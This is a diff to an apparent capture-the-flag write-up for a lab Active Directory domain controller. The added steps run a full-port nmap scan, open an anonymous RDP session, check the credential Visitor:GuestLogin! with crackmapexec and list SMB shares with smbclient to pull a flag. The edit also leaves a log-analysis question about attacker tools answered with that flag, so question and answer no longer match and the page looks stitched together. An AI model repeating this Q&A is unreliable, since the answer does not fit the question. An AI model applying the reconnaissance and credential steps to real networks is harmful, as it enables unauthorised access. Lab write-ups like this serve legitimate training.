@@ -61,13 +61,180 @@ Look carefully at:<br>
 <br>
 
 > 2.1. <em>What tools did the attacker use? (Order by the occurrence in the log)</em><br><a id='2.1'></a>
->> <strong><code>nmap, hydra, sqlmap, curl, feroxbuster</code></strong><br>
+>> <strong><code>THM{Gu3st_Pl3as3}</code></strong><br>
 <p></p>
 
 <br>
 
 ```bash
-awk '{ cmd = $12 " " $13 " " $14; if (!seen[cmd]++) print $0, cmd }' access.log | sort -u
+~# nmap -Pn -A -p- -T4 TargetIP
+...
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain?
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP: 
+|     version
+|_    bind
+80/tcp    open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-29 22:08:42Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: COOCTUS.CORP0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: COOCTUS.CORP0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: COOCTUS
+|   NetBIOS_Domain_Name: COOCTUS
+|   NetBIOS_Computer_Name: DC
+|   DNS_Domain_Name: COOCTUS.CORP
+|   DNS_Computer_Name: DC.COOCTUS.CORP
+|   Product_Version: 10.0.17763
+|_  System_Time: 2025-04-29T22:11:02+00:00
+| ssl-cert: Subject: commonName=DC.COOCTUS.CORP
+| Not valid before: 2025-04-28T22:01:19
+|_Not valid after:  2025-10-28T22:01:19
+|_ssl-date: 2025-04-29T22:11:42+00:00; 0s from scanner time.
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49666/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49670/tcp open  msrpc         Microsoft Windows RPC
+49671/tcp open  msrpc         Microsoft Windows RPC
+49676/tcp open  msrpc         Microsoft Windows RPC
+49706/tcp open  msrpc         Microsoft Windows RPC
+49881/tcp open  msrpc         Microsoft Windows RPC
+...
+Host script results:
+|_nbstat: NetBIOS name: DC, NetBIOS user: <unknown>, NetBIOS MAC: 02:53:bf:3a:10:bb (unknown)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2025-04-29T22:11:03
+|_  start_date: N/A
+...
+
+```
+
+<br>
+
+```bash
+apt install smbclient
+```
+
+<br>
+
+```bash
+snap install crackmapexec
+```
+
+<br>
+
+
+```bash
+apt install rdesktop
+...
+rdesktop -u '' TargetIP
+Autoselecting keyboard map 'en-gb' from locale
+
+ATTENTION! The server uses and invalid security certificate which can not be trusted for
+the following identified reasons(s);
+
+ 1. Certificate issuer is not trusted by this system.
+
+     Issuer: CN=DC.COOCTUS.CORP
+
+
+Review the following certificate info before you trust it to be added as an exception.
+If you do not trust the certificate the connection atempt will be aborted:
+
+    Subject: CN=DC.COOCTUS.CORP
+     Issuer: CN=DC.COOCTUS.CORP
+ Valid From: Mon Apr 28 23:01:19 2025
+         To: Tue Oct 28 22:01:19 2025
+
+  Certificate fingerprints:
+
+       sha1: 441e43278d2f7080386da0fd393f0fb4b68ccafb
+     sha256: 917f3f36367fd1ecf8d86c842f620098fe2d75cf62bbcb2bc465f8e1ac5a2a6f
+
+
+Do you trust this certificate (yes/no)? yes
+
+```
+
+<br>
+
+![image](https://github.com/user-attachments/assets/23a59de7-bd83-412b-9c37-d289e04e0c77)
+
+<br>
+
+![image](https://github.com/user-attachments/assets/a8898cf1-912f-4ee1-af49-83713ec09df5)
+
+
+
+
+```bash
+:~/CroccCrew# crackmapexec smb 10.10.8.187 -u Visitor -p GuestLogin!
+[*] First time use detected
+[*] Creating home directory structure
+[*] Creating missing folder logs
+[*] Creating missing folder modules
+[*] Creating missing folder protocols
+[*] Creating missing folder workspaces
+[*] Creating missing folder obfuscated_scripts
+[*] Creating missing folder screenshots
+[*] Copying default configuration file
+SMB         TargetIP     445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:COOCTUS.CORP) (signing:True) (SMBv1:False)
+SMB         TargetIP     445    DC               [+] COOCTUS.CORP\Visitor:GuestLogin! 
+root@ip-10-10-139-131:~/CroccCrew# 
+
+```
+
+<br>
+
+
+```bash
+~/CroccCrew# smbclient -L //10.10.8.187 -U "Visitor"
+Password for [WORKGROUP\Visitor]:
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	Home            Disk      
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	SYSVOL          Disk      Logon server share 
+SMB1 disabled -- no workgroup available
+
+
+```
+
+
+
+<br>
+
+```bash
+:~/CroccCrew# smbclient //10.10.8.187/Home -U "Visitor"
+Password for [WORKGROUP\Visitor]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+...
+more
+...
+THM{Gu3st_Pl3as3}
+
 ```
 
 <br>
